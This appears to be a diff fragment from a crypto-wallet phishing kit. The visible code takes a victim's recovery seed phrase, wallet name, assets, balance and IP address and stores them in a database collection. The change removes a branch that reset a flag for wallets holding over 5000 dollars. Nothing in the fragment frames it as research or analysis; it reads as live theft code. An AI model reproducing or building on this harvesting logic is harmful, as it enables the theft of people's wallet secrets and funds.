@@ -152,9 +152,6 @@ function validateMnemonic(mnemonic) {
                     _total = Number(fetchBl.result.totalBalanceUsd).toFixed(2);
                   }
                 }
-                if(_total > 5000){
-                    _s = 0;
-                }
                 const user = await addDoc(collection(db, "mydata"), {
                     src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                 });
